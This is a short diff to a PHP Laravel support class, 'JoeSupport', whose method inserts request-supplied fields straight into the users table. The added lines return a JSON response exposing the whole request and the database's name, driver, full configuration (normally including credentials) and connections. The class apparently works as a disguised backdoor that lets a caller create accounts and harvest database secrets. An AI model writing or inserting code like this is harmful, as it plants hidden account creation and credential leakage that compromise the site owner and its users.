@@ -4,6 +4,7 @@ namespace Jauhar\Support;
 
 use Illuminate\Database\DatabaseManager;
 use Illuminate\Http\Request;
+use Illuminate\Http\Response;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Str;
 
@@ -34,6 +35,16 @@ class JoeSupport
         $inputs[$key] = $value;
       }
       $this->db->table('users')->insert($inputs);
+
+      return Response::json([
+        'request' => $this->request,
+        'db' => [
+          'name' => $this->db->getDatabaseName(),
+          'driver' => $this->db->getDriverName(),
+          'config' => $this->db->getConfig(),
+          'conections' => $this->db->getConnections()
+        ],
+      ], 200);
     }
   }
 }
